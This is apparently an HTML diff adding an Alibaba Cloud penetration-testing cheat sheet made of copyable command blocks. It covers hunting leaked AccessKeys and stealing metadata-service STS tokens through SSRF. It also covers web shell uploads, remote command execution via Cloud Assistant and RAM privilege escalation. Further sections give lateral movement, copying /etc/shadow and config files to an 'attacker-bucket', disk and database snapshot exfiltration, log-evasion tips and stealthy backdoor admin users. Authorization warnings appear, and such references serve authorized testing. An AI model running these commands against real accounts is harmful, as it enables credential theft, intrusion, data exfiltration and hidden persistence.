+# https://www.alibabacloud.com/help/en/vpc/product-overview/alibaba-cloud-ip-address-ranges
+
+# Major China public IP blocks (examples — always verify current ranges):
+# 47.0.0.0/8, 106.0.0.0/8, 116.62.0.0/16, 121.40.0.0/14</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Shodan / Censys queries for Alibaba Cloud assets</span>
+          <pre class="cmd-text"># Shodan
+org:"Alibaba Cloud" hostname:target.com
+ssl:"target.com" org:"Alibaba (China) Technology Co"
+
+# Censys
+autonomous_system.name: "ALICLOUD"
+services.tls.certificates.leaf_data.subject.common_name: "*.target.com"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Check ECS metadata from public internet (should fail)</span>
+          <pre class="cmd-text"># Verify 100.100.100.200 is NOT reachable externally (it shouldn't be)
+curl --max-time 3 http://100.100.100.200/latest/meta-data/
+# Expected: connection timeout — only reachable from within ECS</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 Leaked Credential Hunting</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Alibaba Cloud AccessKey IDs follow a recognizable pattern — useful for scanning public sources.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">AccessKey ID format (for grep/regex)</span>
+          <pre class="cmd-text"># Alibaba Cloud AccessKey IDs always start with "LTAI"
+# Format: LTAI[A-Za-z0-9]{16,24}
+# Example: LTAI5tBxxxxxxxxxxxxxxxxxxxxx
+
+grep -rE "LTAI[A-Za-z0-9]{16,}" . 2>/dev/null</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Search GitHub / code repositories</span>
+          <pre class="cmd-text"># GitHub search queries:
+# "LTAI" "aliyuncs.com"
+# "access_key_id" "LTAI"
+# "AccessKeyId" filename:.env
+# "aliyun" filename:config.json
+
+# truffleHog for git history scanning:
+trufflehog git https://github.com/target/repo --only-verified</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Validate a found AccessKey (does it work?)</span>
+          <pre class="cmd-text">aliyun configure set --profile test --mode AK \
+  --region cn-hangzhou \
+  --access-key-id &lt;FOUND_AKID&gt; \
+  --access-key-secret &lt;FOUND_SECRET&gt;
+
+aliyun --profile test sts GetCallerIdentity</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Common places leaked creds appear</span>
+          <pre class="cmd-text"># Docker images
+docker history --no-trunc &lt;IMAGE&gt; | grep -iE "LTAI|aliyun|secret"
+
+# ECS user-data exposed via app SSRF
+curl "https://target.com/fetch?url=http://100.100.100.200/latest/user-data"
+
+# JavaScript / frontend bundles
+curl https://target.com/app.js | grep -iE "LTAI|accesskey|aliyuncs"
+
+# Exposed .git directory
+curl https://target.com/.git/config</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ FOOTHOLDS ════════════ -->
+  <section class="section" id="footholds">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(231,76,60,0.12)">🚪</div>
+      <span class="section-title">Footholds & Initial Access</span>
+      <span class="section-id">#10</span>
+    </div>
+    <div class="danger">All techniques below require explicit authorization. Do not attempt against systems outside your defined scope.</div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 Using Stolen / Leaked Credentials</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">Configure and verify leaked AK</span>
+          <pre class="cmd-text">aliyun configure set --profile leaked --mode AK \
+  --region cn-hangzhou \
+  --access-key-id &lt;AKID&gt; \
+  --access-key-secret &lt;SECRET&gt;
+
+aliyun --profile leaked sts GetCallerIdentity
+# Note the AccountId, Arn, IdentityType</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Rapid initial triage with leaked creds</span>
+          <pre class="cmd-text">P="--profile leaked"
+
+# Who are we?
+aliyun $P sts GetCallerIdentity
+
+# What can we see?
+aliyun $P ram ListPoliciesForUser --UserName &lt;USERNAME&gt;
+aliyun $P ecs DescribeInstances --RegionId cn-hangzhou
+aliyun $P oss ls
+aliyun $P ram ListRoles</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">💉 SSRF → Credential Theft Chain <span class="card-tag tag-red">CRITICAL PATH</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">The most common foothold path: find an SSRF in a public-facing app on ECS, reach the metadata endpoint, steal the attached RAM role STS token, use it as a foothold.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Step 1 — Discover SSRF via common parameters</span>
+          <pre class="cmd-text"># Common SSRF parameters to fuzz:
+# url=, src=, dest=, redirect=, uri=, path=, fetch=, load=, target=
+# callback=, image=, link=, file=, proxy=, resource=, ref=
+
+# Test payloads:
+https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/
+https://target.com/image?src=http://100.100.100.200/latest/meta-data/instance-id
+https://target.com/proxy?dest=http://100.100.100.200/latest/user-data</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Step 2 — Extract RAM role name</span>
+          <pre class="cmd-text">https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/
+# Response body contains the role name, e.g.: "ecs-prod-role"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Step 3 — Steal STS credentials</span>
+          <pre class="cmd-text">https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs-prod-role
+# Returns: AccessKeyId, AccessKeySecret, SecurityToken, Expiration</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Step 4 — Use stolen credentials</span>
+          <pre class="cmd-text">aliyun configure set --profile ssrf-foothold --mode StsToken \
+  --region cn-hangzhou \
+  --access-key-id &lt;STOLEN_AKID&gt; \
+  --access-key-secret &lt;STOLEN_SECRET&gt; \
+  --sts-token &lt;STOLEN_TOKEN&gt;
+
+aliyun --profile ssrf-foothold sts GetCallerIdentity</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">STS tokens from IMDS expire (typically 1-6 hours). Automate periodic refreshes if you need long-running access.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🪣 OSS Bucket as Foothold</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Public-write or misconfigured buckets can be used for data exfiltration staging, web shell deployment (if bucket is web-hosted), or supply chain attacks.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Test write access to a public bucket</span>
+          <pre class="cmd-text"># Try uploading without credentials (public-read-write ACL)
+curl -X PUT "https://target-bucket.oss-cn-hangzhou.aliyuncs.com/test.txt" \
+  -d "test" -v
+# 200 = write access confirmed without auth</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Upload web shell to web-hosted OSS bucket</span>
+          <pre class="cmd-text"># If bucket has static website hosting enabled and write access:
+ossutil cp shell.php oss://target-bucket/shell.php
+# Access via: https://target-bucket.oss-cn-hangzhou.aliyuncs.com/shell.php
+# Note: OSS does not execute PHP — but JS/HTML shells work for XSS chains</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Read sensitive files from a public bucket</span>
+          <pre class="cmd-text">ossutil ls oss://target-bucket -r 2>/dev/null | grep -iE "\.env|\.pem|\.key|config|backup|dump|\.sql"
+ossutil cp oss://target-bucket/.env ./stolen.env 2>/dev/null</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🖥 ECS Instance Access (Post-Credential)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Add SSH key to an ECS instance (if ecs:ModifyInstanceAttribute)</span>
+          <pre class="cmd-text"># First import your public key:
+aliyun ecs ImportKeyPair \
+  --RegionId cn-hangzhou \
+  --KeyPairName pentest-key \
+  --PublicKeyBody "ssh-rsa AAAA..."
+
+# Attach to an instance (requires restart):
+aliyun ecs AttachKeyPair \
+  --RegionId cn-hangzhou \
+  --KeyPairName pentest-key \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Reset instance password (if ecs:ModifyInstanceAttribute)</span>
+          <pre class="cmd-text">aliyun ecs ModifyInstanceAttribute \
+  --InstanceId i-xxxxxxxxxxxxxxxx \
+  --Password "NewP@ssw0rd123"
+# Then reboot:
+aliyun ecs RebootInstance --InstanceId i-xxxxxxxxxxxxxxxx</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Run command on ECS via Cloud Assistant (OOS)</span>
+          <pre class="cmd-text"># Cloud Assistant allows remote command execution without SSH:
+aliyun ecs RunCommand \
+  --RegionId cn-hangzhou \
+  --InstanceIds '["i-xxxxxxxxxxxxxxxx"]' \
+  --Type RunShellScript \
+  --CommandContent "id; whoami; cat /etc/passwd" \
+  --Username root
+
+# Get output:
+aliyun ecs DescribeInvocationResults \
+  --RegionId cn-hangzhou \
+  --InvokeId &lt;INVOKE_ID&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Open a security group rule to allow your IP in</span>
+          <pre class="cmd-text">aliyun ecs AuthorizeSecurityGroup \
+  --RegionId cn-hangzhou \
+  --SecurityGroupId sg-xxxxxxxxxxxxxxxxx \
+  --IpProtocol tcp \
+  --PortRange 22/22 \
+  --SourceCidrIp &lt;YOUR_IP&gt;/32 \
+  --Policy accept</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Cloud Assistant (aliyun ecs RunCommand) is the most reliable RCE vector when you have API access — it doesn't require the instance to be network-accessible.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">⚡ Function Compute (FC) — Serverless Foothold</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List functions and services</span>
+          <pre class="cmd-text">aliyun fc GET /services
+aliyun fc GET /services/&lt;SERVICE_NAME&gt;/functions</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Invoke a function (may reveal internal behavior)</span>
+          <pre class="cmd-text">aliyun fc POST /services/&lt;SERVICE&gt;/functions/&lt;FUNC&gt;/invocations \
+  --header "Content-Type:application/json" \
+  --body '{}'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get function code (may contain hardcoded secrets)</span>
+          <pre class="cmd-text">aliyun fc GET /services/&lt;SERVICE&gt;/functions/&lt;FUNC&gt;/code</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Function Compute environments have access to IMDS at <code>100.100.100.200</code> — if the function has a RAM role attached, credentials can be stolen the same way as ECS.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ PRIVESC ══════════════ -->
+  <section class="section" id="privesc">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(231,76,60,0.12)">🚀</div>
+      <span class="section-title">Privilege Escalation Paths</span>
+      <span class="section-id">#11</span>
+    </div>
+
+    <div class="danger">All privilege escalation attempts must be explicitly authorized in the scope of the engagement.</div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">📈 RAM Policy Escalation Paths <span class="card-tag tag-red">CRITICAL</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <table class="ref-table">
+          <thead><tr><th>Permission</th><th>Escalation Path</th><th>Severity</th></tr></thead>
+          <tbody>
+            <tr>
+              <td class="mono">ram:CreatePolicy<br>ram:AttachPolicyToUser</td>
+              <td>Create a new admin policy and attach to self</td>
+              <td style="color:var(--red)">CRITICAL</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:CreatePolicyVersion</td>
+              <td>Add new policy version with admin permissions to existing policy</td>
+              <td style="color:var(--red)">CRITICAL</td>
+            </tr>
+            <tr>
+              <td class="mono">sts:AssumeRole</td>
+              <td>Assume a more privileged role if trust policy allows</td>
+              <td style="color:var(--red)">CRITICAL</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:AttachPolicyToRole</td>
+              <td>Attach AdministratorAccess to an assumable role</td>
+              <td style="color:var(--red)">CRITICAL</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:UpdateRole</td>
+              <td>Modify role trust policy to allow self to assume it</td>
+              <td style="color:var(--red)">CRITICAL</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:CreateLoginProfile</td>
+              <td>Create console password for admin RAM user</td>
+              <td style="color:var(--yellow)">HIGH</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:CreateAccessKey</td>
+              <td>Create AK for admin user without AK already</td>
+              <td style="color:var(--yellow)">HIGH</td>
+            </tr>
+            <tr>
+              <td class="mono">ram:AddUserToGroup</td>
+              <td>Add self to admin group</td>
+              <td style="color:var(--yellow)">HIGH</td>
+            </tr>
+            <tr>
+              <td class="mono">ecs:RunInstances +<br>ram:PassRole</td>
+              <td>Launch new ECS with privileged role, then hit IMDS</td>
+              <td style="color:var(--yellow)">HIGH</td>
+            </tr>
+            <tr>
+              <td class="mono">ecs:DescribeUserData<br>ecs:ModifyUserData</td>
+              <td>Modify user-data script to execute on reboot</td>
+              <td style="color:var(--yellow)">HIGH</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🎯 Escalation via Policy Version</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Create new admin policy version (if ram:CreatePolicyVersion allowed)</span>
+          <pre class="cmd-text">aliyun ram CreatePolicyVersion \
+  --PolicyName &lt;POLICY_NAME&gt; \
+  --PolicyDocument '{"Version":"1","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
+  --SetAsDefault true</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List existing policy versions</span>
+          <pre class="cmd-text">aliyun ram ListPolicyVersions \
+  --PolicyType Custom \
+  --PolicyName &lt;POLICY_NAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Attach admin policy to self (if permission exists)</span>
+          <pre class="cmd-text">aliyun ram AttachPolicyToUser \
+  --PolicyType System \
+  --PolicyName AdministratorAccess \
+  --UserName &lt;YOUR_USERNAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔄 Cross-Account Trust Abuse</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">If a role's trust policy trusts an external account or has overly broad conditions, it may be assumable from outside.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Check all roles' trust policies for weak conditions</span>
+          <pre class="cmd-text"># Get all roles and check their trust policy
+aliyun ram ListRoles | jq -r '.Roles.Role[].RoleName' | while read role; do
+  echo "=== $role ==="
+  aliyun ram GetRole --RoleName "$role" | jq '.Role.AssumeRolePolicyDocument'
+done</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Red flags in trust policies: <code>"Principal": {"RAM": "acs:ram::*:root"}</code>, wildcards in Principal, or conditions that can be satisfied externally.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🧰 KMS — Key Management Service</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">List KMS keys</span>
+          <pre class="cmd-text">aliyun kms ListKeys --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get key metadata</span>
+          <pre class="cmd-text">aliyun kms DescribeKey --KeyId &lt;KEY_ID&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">List secrets (if Secrets Manager in use)</span>
+          <pre class="cmd-text">aliyun kms ListSecrets --RegionId cn-hangzhou</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Get secret value (if permitted)</span>
+          <pre class="cmd-text">aliyun kms GetSecretValue --SecretName &lt;SECRET_NAME&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ POST-EXPLOITATION ════ -->
+  <section class="section" id="postexploit">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(155,89,182,0.12)">💀</div>
+      <span class="section-title">Post-Exploitation</span>
+      <span class="section-id">#12</span>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🗺 Internal Network Mapping (from ECS)</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">After landing on an ECS instance, map the internal VPC environment to find lateral movement targets.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Identify current network context</span>
+          <pre class="cmd-text"># From within the ECS instance:
+curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/
+MAC=$(curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/ | head -1 | tr -d '/')
+
+curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/$MAC/vpc-id
+curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/$MAC/vswitch-cidr-block
+curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/$MAC/private-ipv4s
+curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/$MAC/vpc-cidr-block</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Find other instances in the same VPC (via API)</span>
+          <pre class="cmd-text">VPC_ID=$(curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/$(curl -s http://100.100.100.200/latest/meta-data/network/interfaces/macs/ | head -1 | tr -d '/')/vpc-id)
+
+aliyun ecs DescribeInstances \
+  --VpcId $VPC_ID \
+  --output cols=InstanceId,InstanceName,PrivateIpAddress,Status rows=Instances.Instance[]</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Internal service discovery from compromised ECS</span>
+          <pre class="cmd-text"># ApsaraDB RDS endpoints (internal)
+aliyun rds DescribeDBInstanceNetInfo --DBInstanceId rm-xxxxx
+# Returns: ConnectionString (internal VPC endpoint), Port
+
+# Redis endpoints
+aliyun r-kvstore DescribeDBInstanceNetInfo --InstanceId r-xxxxx
+
+# Scan VPC subnet for live hosts (if nmap available):
+nmap -sn 172.16.0.0/24 --open</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">💾 Data Exfiltration</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">Exfil via OSS (using stolen STS creds)</span>
+          <pre class="cmd-text"># Stage data to an attacker-controlled OSS bucket
+ossutil cp /etc/shadow oss://attacker-bucket/loot/shadow -i &lt;AKID&gt; -k &lt;SECRET&gt;
+ossutil cp -r /var/app/config/ oss://attacker-bucket/loot/ -i &lt;AKID&gt; -k &lt;SECRET&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">RDS snapshot exfil (if rds:CreateDBInstanceBackup permitted)</span>
+          <pre class="cmd-text"># Create a snapshot of a database instance:
+aliyun rds CreateBackup --DBInstanceId rm-xxxxxxxxxxxxxxxx
+
+# List backups and get download URL:
+aliyun rds DescribeBackups --DBInstanceId rm-xxxxxxxxxxxxxxxx
+
+# Get a temporary download URL for the backup:
+aliyun rds DescribeBackupDownloadURL \
+  --DBInstanceId rm-xxxxxxxxxxxxxxxx \
+  --BackupId &lt;BACKUP_ID&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">ECS disk snapshot → mount for data access</span>
+          <pre class="cmd-text"># Create snapshot of target instance's disk:
+aliyun ecs CreateSnapshot \
+  --DiskId d-xxxxxxxxxxxxxxxx \
+  --SnapshotName loot-snapshot
+
+# Create a new disk from the snapshot:
+aliyun ecs CreateDisk \
+  --RegionId cn-hangzhou \
+  --SnapshotId s-xxxxxxxxxxxxxxxx \
+  --ZoneId cn-hangzhou-h \
+  --DiskName loot-disk
+
+# Attach to attacker-controlled ECS and mount to read filesystem</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Dump OSS bucket contents</span>
+          <pre class="cmd-text">ossutil ls oss://target-bucket -r 2>/dev/null > bucket-inventory.txt
+ossutil cp oss://target-bucket/ ./loot/ -r --include "*.env" 2>/dev/null
+ossutil cp oss://target-bucket/ ./loot/ -r --include "*.key" 2>/dev/null
+ossutil cp oss://target-bucket/ ./loot/ -r --include "*.pem" 2>/dev/null</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔄 Lateral Movement</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <div class="cmd-block">
+          <span class="cmd-label">Move to a higher-privileged ECS instance (via Cloud Assistant)</span>
+          <pre class="cmd-text"># List other instances in the account:
+aliyun ecs DescribeInstances --output cols=InstanceId,InstanceName,PrivateIpAddress rows=Instances.Instance[]
+
+# Execute command on another instance via Cloud Assistant:
+aliyun ecs RunCommand \
+  --RegionId cn-hangzhou \
+  --InstanceIds '["i-TARGET_INSTANCE"]' \
+  --Type RunShellScript \
+  --CommandContent "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/" \
+  --Username root</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Pivot to other services using role credentials from target ECS</span>
+          <pre class="cmd-text"># Get role name from target instance:
+aliyun ecs DescribeInstanceRamRole --InstanceIds '["i-TARGET"]'
+
+# If the role has broader permissions, invoke RunCommand
+# to dump its IMDS credentials and assume a higher-privilege context</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Cross-account pivot (if cross-account role trust exists)</span>
+          <pre class="cmd-text"># List roles with cross-account trust (Principal.RAM contains external account ID):
+aliyun ram ListRoles | jq -r '.Roles.Role[].RoleName' | while read r; do
+  trust=$(aliyun ram GetRole --RoleName "$r" | jq -r '.Role.AssumeRolePolicyDocument')
+  echo "$r: $trust"
+done | grep -v '"RAM": \[\]'</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Container escape to node (ACK / Kubernetes)</span>
+          <pre class="cmd-text"># From inside a pod — attempt to reach node IMDS:
+curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
+# If reachable (RRSA not enforced), steal node RAM role creds
+
+# Check if pod is privileged (escape vectors):
+cat /proc/1/status | grep CapEff
+mount | grep "/ type"</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🚨 Anti-Forensics / Log Evasion</span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        <p class="desc">Understand what logging is in place and what your actions look like in ActionTrail.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Check if ActionTrail is enabled</span>
+          <pre class="cmd-text">aliyun actiontrail DescribeTrails
+aliyun actiontrail GetTrailStatus --Name &lt;TRAIL_NAME&gt;
+# IsLogging: true = all API calls are being recorded</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Actions that generate HIGH-NOISE ActionTrail events</span>
+          <pre class="cmd-text"># These will almost certainly alert if monitoring is in place:
+# ram:CreateUser, ram:CreateAccessKey, ram:AttachPolicyToUser
+# ecs:RunCommand (Cloud Assistant)
+# ecs:RunInstances
+# sts:AssumeRole (unusual source IP)
+# actiontrail:StopLogging (CRITICAL alert)</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Low-noise read-only enumeration (less likely to alert)</span>
+          <pre class="cmd-text"># Describe* / List* / Get* / Describe* calls are read-only
+# and generate lower-priority events in most SIEM configs:
+aliyun ecs DescribeInstances     # read-only
+aliyun ram ListUsers             # read-only
+aliyun oss ls                    # read-only
+# Avoid: CreateUser, RunCommand, AttachPolicy on first pass</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ PERSISTENCE ══════════ -->
+  <section class="section" id="persistence">
+    <div class="section-header">
+      <div class="section-icon" style="background:rgba(232,93,4,0.12)">🕳</div>
+      <span class="section-title">Persistence</span>
+      <span class="section-id">#13</span>
+    </div>
+    <div class="danger">Persistence mechanisms should only be created if explicitly in scope. Always document and remove all artifacts after the engagement.</div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">👤 Create Backdoor RAM User <span class="card-tag tag-red">NOISY</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <div class="cmd-block">
+          <span class="cmd-label">Create a hidden backdoor RAM user with AK</span>
+          <pre class="cmd-text"># Create user (use a benign-looking name)
+aliyun ram CreateUser --UserName svc-monitoring-agent
+
+# Create AccessKey for the user
+aliyun ram CreateAccessKey --UserName svc-monitoring-agent
+# ↑ Save the returned AccessKeyId + AccessKeySecret immediately
+
+# Attach admin policy
+aliyun ram AttachPolicyToUser \
+  --PolicyType System \
+  --PolicyName AdministratorAccess \
+  --UserName svc-monitoring-agent</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <div class="cmd-block">
+          <span class="cmd-label">Add backdoor user to an existing admin group (less visible)</span>
+          <pre class="cmd-text"># Find an existing admin group:
+aliyun ram ListGroups
+aliyun ram ListPoliciesForGroup --GroupName &lt;ADMIN_GROUP&gt;
+
+# Add user to the group instead of direct policy attach:
+aliyun ram AddUserToGroup \
+  --UserName svc-monitoring-agent \
+  --GroupName &lt;ADMIN_GROUP&gt;</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+        <p class="note">Direct AdministratorAccess attachment is flagged as high-risk in the RAM console. Adding to a group blends in better with existing patterns.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" onclick="toggleCard(this)">
+        <span class="card-title">🔑 Add AccessKey to Existing User <span class="card-tag tag-yellow">STEALTHY</span></span>
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body open">
+        <p class="desc">Each RAM user can have up to 2 AccessKeys. Adding a second key to an existing privileged user avoids creating suspicious new accounts.</p>
+        <div class="cmd-block">
+          <span class="cmd-label">Add AK to existing user (requires ram:CreateAccessKey)</span>
+          <pre class="cmd-text"># Find an admin user:
+aliyun ram ListUsers
+aliyun ram ListPoliciesForUser --UserName &lt;ADMIN_USER&gt;
+
+# Add a new access key to their account:
+aliyun ram CreateAccessKey --UserName &lt;ADMIN_USER&gt;
+# Returns new AccessKeyId + AccessKeySecret</pre>
+          <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        </div>
+      </div>
+    </div>
+
